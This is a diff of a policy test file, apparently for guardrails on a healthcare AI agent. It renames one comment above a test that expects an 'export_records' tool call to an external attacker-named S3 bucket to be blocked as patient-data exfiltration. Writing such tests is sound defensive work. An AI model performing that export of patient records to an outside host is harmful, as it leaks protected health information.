@@ -31,7 +31,7 @@ test_benign_schedule_read_allowed {
     d == "allow"
 }
 
-# === F-21 PHI export-egress (clean-param exfil: no PHI field key in params) ===
+# === PHI export-egress (clean-param exfil: no PHI field key in params) ===
 test_export_records_external_blocked {
     inp := {"tool_name": "export_records", "tool_params": {"destination": "s3://audit-backup-external.attacker.com"}}
     healthcare.decision == "block" with input as inp
